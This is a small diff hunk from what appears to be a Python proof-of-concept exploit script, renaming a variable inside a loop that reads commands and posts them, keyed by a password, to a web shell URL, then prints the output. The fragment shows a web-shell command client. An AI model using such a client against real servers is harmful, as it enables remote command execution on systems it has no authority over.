@@ -19,10 +19,10 @@ def poc():
 			try:
 				command = raw_input("[*] input the command:")
 				if command != "exit":
-					postdata = {
+					postData = {
 						password : command
 					}
-					r = requests.post(shell, data=postdata)
+					r = requests.post(shell, data=postData)
 					print(r.text.encode(r.encoding)[:r.text.find("<!DOCTYPE HTML>")])
 				else:
 					break
